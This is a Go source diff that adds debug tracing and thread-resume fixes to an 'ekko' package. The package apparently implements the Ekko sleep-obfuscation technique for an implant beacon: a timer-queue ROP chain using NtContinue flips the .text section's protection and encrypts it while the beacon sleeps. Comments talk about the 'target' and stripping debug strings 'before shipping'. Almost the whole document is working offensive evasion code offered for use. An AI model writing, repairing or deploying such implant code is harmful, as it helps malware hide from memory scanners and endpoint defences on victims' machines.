@@ -3,6 +3,7 @@ package ekko
 import (
 	"crypto/rand"
 	"errors"
+	"fmt"
 	"log"
 	"runtime"
 	"sync/atomic"
@@ -32,6 +33,19 @@ const (
 	// plenty on any realistic host and doesn't meaningfully change beacon
 	// timing under normal conditions.
 	ekkoWaitGraceMs = 5000
+
+	// ekkoDebug enables OutputDebugStringA probes at every major transition
+	// in EkkoSleep and ekko(). When true, run DebugView on the target and
+	// filter by "[ekko" to see a live trace of cycles. Strings are compiled
+	// in even when this is false — set to false and rebuild before shipping.
+	ekkoDebug = true
+
+	// Upper bound on how many times we call ResumeThread per TID when
+	// draining a possibly-elevated suspend count (e.g. a race with Go's
+	// sysmon async-preemption). Windows caps a thread's suspend count at
+	// MAXIMUM_SUSPEND_COUNT = 0x7F; 32 iterations is more than we should
+	// ever need and prevents a runaway API from spinning here forever.
+	maxResumeDrain = 32
 )
 
 var (
@@ -50,6 +64,7 @@ var (
 	procSetEvent              = kernel32dll.NewProc("SetEvent")
 	procDeleteTimerQueue      = kernel32dll.NewProc("DeleteTimerQueue")
 	procDeleteTimerQueueEx    = kernel32dll.NewProc("DeleteTimerQueueEx")
+	procOutputDebugStringA    = kernel32dll.NewProc("OutputDebugStringA")
 
 	//ntdll
 	ntdll                        = syscall.NewLazyDLL("ntdll.dll")
@@ -75,11 +90,33 @@ var ErrEkkoTimeout = errors.New("ekko: ROP chain did not complete within grace p
 var (
 	ekkoSuccesses atomic.Uint64
 	ekkoTimeouts  atomic.Uint64
+	ekkoCycles    atomic.Uint64 // Total EkkoSleep invocations (for correlating debug probes)
 )
 
-// Stats returns cumulative Ekko success and timeout counts since process start.
-func Stats() (successes, timeouts uint64) {
-	return ekkoSuccesses.Load(), ekkoTimeouts.Load()
+// Stats returns cumulative Ekko counters since process start.
+//   cycles    = total EkkoSleep invocations
+//   successes = cycles where the ROP chain signalled hEvent before timeout
+//   timeouts  = cycles where the bounded wait fell through to recovery
+func Stats() (cycles, successes, timeouts uint64) {
+	return ekkoCycles.Load(), ekkoSuccesses.Load(), ekkoTimeouts.Load()
+}
+
+// dbg emits a single line via OutputDebugStringA when ekkoDebug is true.
+// The Windows kernel drops the call silently if no debugger is attached,
+// so this is cheap in normal operation — but the format strings ARE in the
+// binary's data section, so gate at compile time (ekkoDebug=false) before
+// shipping.
+func dbg(format string, args ...any) {
+	if !ekkoDebug {
+		return
+	}
+	msg := fmt.Sprintf("[ekko] "+format+"\n", args...)
+	p, err := windows.BytePtrFromString(msg)
+	if err != nil {
+		return
+	}
+	procOutputDebugStringA.Call(uintptr(unsafe.Pointer(p)))
+	runtime.KeepAlive(p)
 }
 
 func EkkoSleep(sleepTime uint64) error {
@@ -93,6 +130,9 @@ func EkkoSleep(sleepTime uint64) error {
 	// suspended, stack frozen inside NtSuspendThread, inside EkkoSleep.
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
+
+	cycle := ekkoCycles.Add(1)
+	dbg("cycle=%d enter EkkoSleep sleepMs=%d", cycle, sleepTime)
 
 	currentProcessID := uint32(windows.GetCurrentProcessId())
 	currentTID := windows.GetCurrentThreadId()
@@ -157,26 +197,64 @@ func EkkoSleep(sleepTime uint64) error {
 	}
 
 
+	dbg("cycle=%d suspend loop done, suspendedTIDs=%d", cycle, len(suspendedTIDs))
+
 	ekkoErr := ekko(sleepTime)
-	if errors.Is(ekkoErr, ErrEkkoTimeout) {
+	switch {
+	case errors.Is(ekkoErr, ErrEkkoTimeout):
 		ekkoTimeouts.Add(1)
-	} else if ekkoErr == nil {
+		dbg("cycle=%d ekko() TIMED OUT", cycle)
+	case ekkoErr == nil:
 		ekkoSuccesses.Add(1)
+		dbg("cycle=%d ekko() ok", cycle)
+	default:
+		dbg("cycle=%d ekko() err=%v", cycle, ekkoErr)
 	}
+
+	dbg("cycle=%d entering resume loop", cycle)
 
 	// Resume exactly the threads we suspended. Iterate the captured TID list
 	// rather than re-walking the snapshot, so a single OpenThread failure
 	// (e.g. a thread exited during the sleep) cannot prevent the remaining
 	// suspended threads from being resumed.
+	//
+	// Drain the suspend count in a loop, not with a single ResumeThread. Go's
+	// sysmon does async preemption on Windows by SuspendThread + patch RIP +
+	// ResumeThread, and if that interleaves with our own SuspendThread on the
+	// same M the counter can end up above 1. Then a single ResumeThread only
+	// decrements it to 1 and the M stays suspended forever — an accumulation
+	// bug that we could not reproduce with pen-and-paper interleaving but
+	// which the dumps show clearly (some Ms end up permanently Suspended with
+	// zero recorded CPU time, i.e. suspended before ever running an
+	// instruction). ResumeThread returns the PREVIOUS suspend count and
+	// stops decrementing at 0, so looping while `previous > 1` is safe.
+	resumeFailures := 0
+	drainedTotal := uint32(0)
 	for _, tid := range suspendedTIDs {
 		hThread, openErr := windows.OpenThread(threadAccess, false, tid)
 		if openErr != nil {
 			// Thread is gone; nothing left to resume for this TID. Keep going.
+			resumeFailures++
 			continue
 		}
-		procResumeThread.Call(uintptr(hThread))
+		var drains uint32
+		for drains = 0; drains < maxResumeDrain; drains++ {
+			r, _, _ := procResumeThread.Call(uintptr(hThread))
+			// r is the previous suspend count. -1 (DWORD) is error;
+			// 0 means it wasn't suspended (nothing to do); 1 means
+			// it's now fully resumed; >1 means keep draining.
+			if r == 0 || r == 1 || r == ^uintptr(0) {
+				break
+			}
+		}
+		if drains > 1 {
+			dbg("cycle=%d TID=%d drained %d extra resumes", cycle, tid, drains-1)
+			drainedTotal += drains - 1
+		}
 		windows.CloseHandle(hThread)
 	}
+
+	dbg("cycle=%d resume complete, openFailures=%d extraDrains=%d", cycle, resumeFailures, drainedTotal)
 
 	return ekkoErr
 }
@@ -213,6 +291,7 @@ func ekko(sleepTime uint64) error {
 	procCreateTimerQueueTimer.Call(uintptr(unsafe.Pointer(&hNewTimer)), hTimerQueue, procRtlCaptureContext.Addr(), uintptr(unsafe.Pointer(&CtxThread)), 0, 0, WT_EXECUTEINTIMERTHREAD)
 	windows.WaitForSingleObject(windows.Handle(hEvent), 0x100)
 
+	dbg("ekko() CtxThread.Rip=0x%x", CtxThread.Rip)
 	if CtxThread.Rip == 0 {
 		log.Fatalln()
 	}
@@ -273,7 +352,9 @@ func ekko(sleepTime uint64) error {
 	if waitTimeout > 0xFFFFFFFE {
 		waitTimeout = 0xFFFFFFFE // clamp: never accidentally pass INFINITE
 	}
+	dbg("ekko() bounded wait timeoutMs=%d", waitTimeout)
 	waitResult, _ := windows.WaitForSingleObject(windows.Handle(hEvent), uint32(waitTimeout))
+	dbg("ekko() bounded wait returned result=0x%x", waitResult)
 
 	if waitResult != windows.WAIT_OBJECT_0 {
 		// Timed out (or waited on an abandoned/failed event). Drain the queue
@@ -282,7 +363,15 @@ func ekko(sleepTime uint64) error {
 		// so no NtContinue can fire on a thread-pool worker after we've
 		// returned and started resuming threads / mutating memory. Plain
 		// DeleteTimerQueue would NOT wait, which is why we don't reuse it here.
+		//
+		// KNOWN RISK: if the callback thread has been hijacked by NtContinue
+		// and never signals completion to the pool, DeleteTimerQueueEx(...,
+		// INVALID_HANDLE_VALUE) can itself block indefinitely. The probes
+		// around this call exist so we can see, from DebugView, whether that
+		// happens in practice.
+		dbg("ekko() recovery: entering DeleteTimerQueueEx")
 		procDeleteTimerQueueEx.Call(hTimerQueue, ^uintptr(0))
+		dbg("ekko() recovery: DeleteTimerQueueEx returned")
 
 		// Force .text back to executable in case the chain got as far as
 		// RopProtRW / RopMemEnc but not RopProtRX / RopMemDec. Restoring to
@@ -298,6 +387,7 @@ func ekko(sleepTime uint64) error {
 			uintptr(windows.PAGE_EXECUTE_READWRITE),
 			uintptr(unsafe.Pointer(&oldProt)),
 		)
+		dbg("ekko() recovery: VirtualProtect returned oldProt=0x%x", oldProt)
 		return ErrEkkoTimeout
 	}
 
